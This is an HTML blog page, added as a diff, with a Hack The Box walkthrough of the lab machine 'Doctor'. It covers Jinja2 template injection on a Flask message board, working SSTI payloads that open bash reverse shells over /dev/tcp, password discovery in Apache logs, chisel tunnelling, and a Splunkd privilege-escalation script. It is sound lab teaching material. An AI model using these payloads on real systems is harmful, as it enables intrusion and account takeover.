@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.80.0" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark"><title>HTB Doctor&nbsp;&ndash;&nbsp;The Wolf Den</title><link rel="stylesheet" href="/css/core.min.ab321a2ad61315bebb72e6e3fa1108c4e8ffe4eada5cf5f20131d183a523496246d761df8fc832549be5b9dd47c40509.css" integrity="sha384-qzIaKtYTFb67cubj&#43;hEIxOj/5OraXPXyATHRg6UjSWJG12Hfj8gyVJvlud1HxAUJ"><meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="HTB Doctor" /><body><section id="header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/"><span class="site name">The Wolf Den</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/ctf-writeups">CTF Writeups</a><a class="nav item" href="/htb-writeups">HTB Writeups</a><a class="nav item" href="/about">About</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
+    <h1 class="article title">HTB Doctor</h1><p class="article date">2021-03-04</p></section><article class="article markdown-body"><p><img  src="img/doctor-logo.png"
+        alt/></p>
+<p>Doctor has a &ldquo;secure&rdquo; message board system that allows us to gain code execution. From there, we access logs, find credentials, and privilege escalate to root by taking advantage of our local access to Spulnkd.</p>
+<h2 id="enumeration">Enumeration</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sC -sV 10.10.10.209 -oA Doctor
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-10-18 19:07 UTC
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.209
+Host is up <span style="color:#f92672">(</span>0.11s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">997</span> filtered ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+80/tcp   open  http     Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Doctor
+8089/tcp open  ssl/http Splunkd httpd
+| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry
+|_/
+|_http-server-header: Splunkd
+|_http-title: splunkd
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SplunkServerDefaultCert/organizationName<span style="color:#f92672">=</span>SplunkUser
+| Not valid before: 2020-09-06T15:57:27
+|_Not valid after:  2023-09-06T15:57:27
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>We begin our enumeration with nmap. We find that port 22 is open for ssh 8080 for a web server and 8089 is running splunkd. 8089 looks interesting but when we attempt to connect were are unsuccessful. I could have gotten a bit further here but we end up coming back to it later. Instead, we got to check out the website on port 80.</p>
+<h2 id="port-80">Port 80</h2>
+<p>We navigate to http://10.10.10.209/ and find a web page.</p>
+<p><img  src="img/doctor-port80homepage.png"
+        alt/></p>
+<p>Looking through this site we can find a few potentially useful pieces of information. The names of a number of doctors are listed which might equate to possible usernames. We also notice an interesting email address. <code>info@doctors.htb</code></p>
+<p>This is interesting because based on the name of this box the domain of the site we are on is probably <code>doctor.htb</code> and this email references another domain name. We edit our /etc/hosts file to include both of these two sites.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">10.10.10.209 doctor.htb doctors.htb
+</code></pre></div><p>Sure enough, <code>doctor.htb</code> points to the site we found. <code>doctors.htb</code>, takes us to a new site.</p>
+<p><img  src="img/doctor-doctorsdomain.png"
+        alt/></p>
+<p>Here we see a login form for &ldquo;Doctor Secure Messaging&rdquo;. We don&rsquo;t have any credentials at this time. <code>info@doctors.htb</code> might be a username but we don&rsquo;t have any idea about the password. Instead, we opt to create an account. We create an account and are told that it will exist for 20 minutes</p>
+<p><img  src="img/doctor-loggedintosecuremessaging.png"
+        alt/></p>
+<p>We are able to create messages that are then shared for us and other logged in users to see. We also have access to a profile page but don&rsquo;t seem to be able to edit any information there.</p>
+<p>We go back and take another look at the message posting function. We don&rsquo;t see anything obvious here but we do find something interesting in the source code.</p>
+<p><img  src="img/doctor-archivesource.png"
+        alt/></p>
+<p>We head to <code>http://doctors.htb/archive</code> and are greeted by a blank page. Doesn&rsquo;t seem to be anything interesting here. We go back to the message creation system and looking through the source good find reference to Werkzeug, a python web application library. <a href="https://werkzeug.palletsprojects.com/en/1.0.x/">https://werkzeug.palletsprojects.com/en/1.0.x/</a></p>
+<p>Now that we know a bit more about what we are looking at. We start to do some more research on what types of vulnerabilities we might be able to exploit. Server Side Template Injection catches our eye</p>
+<p>We reference fantastic resource called PayloadsAllTheThings to find something get an idea of how to format our injection. We find a fairly simple one <code>{{7 * 7}}</code> We enter it in to the title section and then create the message to see if we can see a result.</p>
+<p><img  src="img/doctor-7times7.png"
+        alt/></p>
+<p>And unfortunately, we find nothing. We try our injection in the content section and again have no results that we can see. We starting looking around, expanding our search in an effort to locate where we can trigger our code to execute. Then, we notice something. The Archive page <em>isn&rsquo;t</em> empty as we first thought. The content just isn&rsquo;t rendered by the browser. In fact, it displays the titles of the currently posted messages.</p>
+<p><img  src="img/doctor-archivehelloworld.png"
+        alt/></p>
+<p>We set our title back to {{7 * 7}} and check to see if it shows up on this page.</p>
+<p><img  src="img/doctor-7777777.png"
+        alt/></p>
+<p>Success! Now we just need to find a way to get a reverse shell out of this.</p>
+<p>We refer back to the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#Jinja2"target="_blank">PayloadsAllTheThings</a> GitHub repository and see if there is anything that might lead to a revers shell. Sure enough there is but it doesn&rsquo;t seem to function for us.</p>
+<p>We then turn back to google and look for examples of Server Side Template Injection in python. Takes a bit of research but we eventually find and modify something to result in the below code.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;warning&#34;</span> <span style="color:#f92672">in</span> x<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">%</span>}{{x()<span style="color:#f92672">.</span>_module<span style="color:#f92672">.</span>__builtins__[<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.28/4678 0&gt;&amp;1&#39;&#34;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">417</span>)}}{<span style="color:#f92672">%</span>endif<span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
+</code></pre></div><p>This second one is a bit smaller, neater, and also works according to what I am told.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{{request<span style="color:#f92672">.</span>application<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.19/4678 0&gt;&amp;1&#39;&#34;</span>)<span style="color:#f92672">.</span>read()}}
+</code></pre></div><p>Whichever you opt for, set up a netcat listener, modify the payload to the appropriate ip and port, create a message with the payload set as the title and then load the archive page. If all goes well, you should get a shell.</p>
+<p><img  src="img/doctor-shelllllll.png"
+        alt/></p>
+<h2 id="user">User</h2>
+<p>First thing we do is nicen up our shell just a bit by spawning a python pusdo terminal.</p>
+<p><code>python3 -c 'import pty; pty.spawn (&quot;/bin/bash&quot;)'</code></p>
+<p>Then we start working on enumeration. One of ther every first things worth checking is the groups that your current user is in.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">web@doctor:~$ id
+id
+uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>web<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>web<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>web<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>
+</code></pre></div><p>The adm group looks interesting. Adm is a group that be used to monitor system tasks. Those in this group may read much of the log files stored in /var/log. The name of the group apparently is due to <code>/var/log</code> being named <code>/usr/adm</code> initially.</p>
+<p>Logs can contain a lot of potentially useful info. The challenge is there is a lot of data to parse. We try grepping for username, password, and shaun, who we guess to be the user we are looking for based on the <code>/home</code> directory but come up empty.</p>
+<p>Eventuall,y we start sifting through the appache2 logs and notice a helpfully named, &lsquo;backup&rsquo; file. We start reading though it and find record of a password reset request.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/var/logs/apache2/backup
+...
+10.10.14.4 - - <span style="color:#f92672">[</span>05/Sep/2020:11:17:34 +2000<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;POST /reset_password?email=Guitar123&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">453</span> <span style="color:#e6db74">&#34;http://doctor.htb/reset_password&#34;</span>
+</code></pre></div><p>It seems that <code>Guitar123</code> could be useful. We attempt to su to shaun and are authenticated successfully. Collect and submit user.txt and we are ready to proceed.</p>
+<p><img  src="img/doctor-shaun.png"
+        alt/></p>
+<h2 id="root">Root</h2>
+<p>Now that we have user it is time for us to go back&hellip; back to the beginning&hellip; It&rsquo;s time to take second look at Splunk.</p>
+<p>I ended up running around in quite a few rabbit holes here. First off I wasn&rsquo;t able to establish a connection to <code>http://10.10.10.209:8089/</code> The connection was reset as the page was loading according to Firefox.  My first idea was that we needed to portforward. Maybe though we could see it publicly, but for some reason it was configured to only  allow connections from localhost.</p>
+<h4 id="chisel-rabbit-hole">Chisel Rabbit hole</h4>
+<p>Server (Our machine)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chisel server -p <span style="color:#ae81ff">8000</span> -reverse
+</code></pre></div><p>Client (Doctor)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">shaun@doctor:/dev/shm$ ./chisel client 10.10.14.28:8000 R:2345:0.0.0.0:8089
+./chisel client 10.10.14.28:8000 R:2345:0.0.0.0:8089
+2020/10/21 04:55:28 client: Connecting to ws://10.10.14.28:8000
+2020/10/21 04:55:29 client: Fingerprint c3:89:2b:51:c4:ea:9f:ba:5c:16:ee:70:e1:73:a3:54
+2020/10/21 04:55:29 client: Connected <span style="color:#f92672">(</span>Latency 99.441373ms<span style="color:#f92672">)</span>
+</code></pre></div><p>Chisel is up and port forwarding is successful. We attempt again but have the same result. :-(</p>
+<h4 id="the-right-path-somewhat">The right path&hellip; somewhat.</h4>
+<p>After far too long. We attempt to use <strong>HTTPS</strong> instead of HTTP to connect. We are then prompted to accept or reject and un trusted certificate. Accept, and we are connected.</p>
+<p>Now that we have access we look around a bit and are quickly greeted by a login prompt. Enter Shaun&rsquo;s credentials however, and we are granted access. Now we just need to find an exploit. I initially look for a Splunk Exploit. We find an <a href="https://www.exploit-db.com/exploits/46238"target="_blank">entry on Exploit DB</a> that requires authentication, no problem for us. And we get it running.</p>
+<p>This is a bit tricky because  of the fact that the Firefox binary on our path actually is just a shell script that references the real binary. Selinum has some problems with this as described in a <a href="https://github.com/SeleniumHQ/selenium/issues/3884"target="_blank">GitHub issue.</a></p>
+<p>We work around it by temporarily adding the path to the <em>actual</em> Firefox binary to the front of our path</p>
+<pre><code> export PATH=/usr/lib/firefox/:$PATH
+ python2 SplunkExploit.py http://10.10.10.209:8089/ shaun Guitar123 10.10.14.28 4689
+</code></pre><p>We are again met with disappointment. Then we notice that we aren&rsquo;t actually attempting to exploit the Splunk Web server but rather the <strong>Splunkd</strong> service.</p>
+<h4 id="actually-root">Actually root</h4>
+<p>We refine our search and find this <a href="https://github.com/tevora-threat/splunk_local_privesc/blob/master/spelunker.sh"target="_blank">GitHub repository.</a></p>
+<p>It is a local privilege escalation that leverages Splunkd, creating a malicious Splunk app. That sounds much more like what we need.</p>
+<p>We copy it into a file on our Attacker machine and modify the base64 encoded credentials to be shaun:Guitar123 instead of the default admin:changeme</p>
+<p>We then stand up python http server in the directory where we have the script.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo python -m http.server <span style="color:#ae81ff">80</span>
+</code></pre></div><p>Then we wget it over, mark it as executable, and run the script.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget http://10.10.14.19/script.py
+chmod +x script.py
+./script.py
+</code></pre></div><p>It directs us to run ta file it created and then clean up after ourselves.</p>
+<p><img  src="img/doctor-root.png"
+        alt/></p>
+<p>And just like that we are root.</p>
+<h2 id="wrap-up">Wrap up</h2>
+<p>I overall really liked this box. I learned some new things in the form of Server Side Template Injection and enjoyed privilege escalation. Lots of enumeration and paying attention was required on this box. I definitely missed that a few times and ended up in rabbit holes.</p>
+<p>I did kind of dislike the time limit on the accounts. It was a pain to get much research done. It seemed, every time I came back from an article with something new to try I needed to create a new account. The other challenge was this was in a shared space. Part of the time I was working on the box there was another use present. I was concerned not only about inadvertently spoiling the foothold but also found it difficult to get a shell while they attempted various things. It often seemed to break the archive page.</p>
+<p>Once again thought I really enjoyed this box. Thanks <a href="https://app.hackthebox.eu/users/94858"target="_blank">egotisticalSW</a> for making it!</p>
+</article></div>
+<div class="article bottom"><section class="article navigation"><p><a class="link" href="/posts/omni-writeup/"><span class="iconfont icon-article"></span>HTB Omni</a></p></section></div></section><section id="footer"><div class="footer-wrap">
+    <p class="copyright">The Wolf Den</p>
+    <p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
+        target="_blank">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank">Notepadium</a></p></div></section></body>
+
+</html>
